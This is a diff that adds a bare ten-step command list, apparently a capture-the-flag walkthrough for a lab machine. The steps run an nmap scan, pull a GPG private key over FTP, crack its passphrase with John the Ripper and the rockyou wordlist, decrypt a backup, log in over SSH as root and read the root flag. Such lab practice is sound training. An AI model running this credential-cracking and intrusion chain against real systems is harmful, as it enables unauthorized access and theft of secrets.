@@ -1,0 +1,10 @@
+1 - nmap -A 10.10.6.82
+2 - ftp 10.10.6.82
+3 - cd notread
+4 - gpg2john private.asc > hash
+5 - john hash
+6 - gpg --import private.asc
+7 - gpg --decrypt backup.pgp
+8 - john hash -w=/usr/share/wordlists/rockyou.txt
+9 - ssh root@10.10.6.82
+10 - cat root.txt
